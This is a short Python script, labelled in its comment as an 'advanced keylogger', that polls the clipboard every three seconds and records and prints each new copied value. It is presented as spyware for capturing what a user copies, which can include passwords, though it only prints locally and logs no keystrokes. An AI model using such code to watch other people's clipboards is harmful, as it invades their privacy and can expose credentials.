# Advanced keylogger with Copy and Paste Capture feature with pyperclip

import pyperclip
import time

list = []
while True:
    if pyperclip.paste() != 'None':
        value = pyperclip.paste()

        if value not in list:
            list.append(value)

        print(list)

        time.sleep(3)
